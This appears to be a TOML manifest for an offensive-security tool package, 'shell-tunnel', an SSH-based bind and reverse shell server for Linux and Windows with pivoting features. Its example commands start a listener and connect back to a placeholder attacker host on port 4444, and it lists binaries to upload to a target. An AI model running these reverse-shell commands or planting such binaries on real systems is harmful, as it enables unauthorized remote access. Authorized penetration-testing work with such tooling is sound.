schema = 1
kind = "both"
description = "Static SSH server for bind and reverse shells with PTY, SFTP and port forwarding"
tags = ["ssh", "shell", "pivot", "sftp", "tunnel", "linux", "windows"]
upstream = "https://github.com/Real-Fruit-Snacks/shell-tunnel"
licence = "GPL-3.0"
arch = "x86_64"
examples = [
  "shell-tunnel -l -v -p 4444",
  "./shell-tunnel -d {lhost}:4444",
  "shell-tunnel.exe -d {lhost}:4444",
]

[[command]]
name = "shell-tunnel"
type = "binary"
path = "files/shell-tunnel"

[[upload]]
path = "files/shell-tunnel"
as = "shell-tunnel"
note = "Linux x86_64"

[[upload]]
path = "files/shell-tunnel.exe"
as = "shell-tunnel.exe"
note = "Windows x86_64"
